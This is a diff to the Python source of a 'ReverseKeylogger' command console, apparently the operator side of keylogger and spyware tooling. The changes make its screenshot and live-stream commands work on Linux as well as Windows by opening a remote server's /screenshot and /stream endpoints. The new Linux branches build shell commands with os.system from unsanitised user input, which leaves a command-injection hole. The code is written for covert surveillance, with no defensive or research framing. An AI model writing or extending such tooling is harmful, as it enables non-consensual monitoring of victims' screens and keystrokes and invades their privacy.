@@ -1,6 +1,7 @@
 import requests
 import cmd
 import os
+import platform
 class ReverseKeylogger(cmd.Cmd):
     intro = "Reverse Keylogger v0.0.0 (plz work)"
     prompt = "ReverseKeylogger> "
@@ -115,11 +116,17 @@ class ReverseKeylogger(cmd.Cmd):
         else:
             print("Invalid command")
     def do_ss(self, arg):
-        os.startfile(url + "/screenshot")
+        if platform.system() == 'Windows':
+            os.startfile(url + "/screenshot")
+        elif platform.system() == 'Linux':
+            os.system(f"xdg-open {url}/screenshot")
         print("Screenshot taken")
-        
+
     def do_stream(self, arg):
-        os.startfile(url + f"/stream/{arg}")
+        if platform.system() == 'Windows':
+            os.startfile(url + f"/stream/{arg}")
+        elif platform.system() == 'Linux':
+            os.system(f"xdg-open {url}/stream/{arg}")
         print("Stream started")
 
     def do_clear(self, arg):
